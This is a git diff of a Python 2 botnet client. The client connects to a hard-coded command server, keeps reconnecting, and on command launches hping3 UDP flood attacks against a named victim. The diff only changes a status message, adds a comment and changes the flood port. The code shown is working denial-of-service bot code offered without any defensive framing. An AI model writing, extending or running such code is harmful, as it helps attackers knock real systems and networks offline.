@@ -11,7 +11,7 @@ CommandServer = ('192.168.2.2', 666)
 def endProc(proc):
 	if proc != None:
 		proc.terminate()
-		print 'termiated'
+		print 'Attack stopped!'
 
 if __name__=='__main__':
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -21,7 +21,7 @@ if __name__=='__main__':
 		data = server.recv(1024)
 		if data == '':
 			try:
-				server.connect(CommandServer)
+				server.connect(CommandServer)	# Constantly attempt to reconnect - not beautiful, but functional 
 			except Exception as e:
 				print 'Could not reach Command server!'
 
@@ -48,7 +48,7 @@ if __name__=='__main__':
 			elif atkType == 'udp':
 				print 'Running a UDP attack...'
 				endProc(attack) # terminate previous
-				attack = subprocess.Popen(["hping3", "--flood", "--udp", "p", "666", victim], stdout=subprocess.PIPE)
+				attack = subprocess.Popen(["hping3", "--flood", "--udp", "p", "420", victim], stdout=subprocess.PIPE)
 		elif command == 'STOP':
 			endProc(attack)
 			print 'Attack stopped'
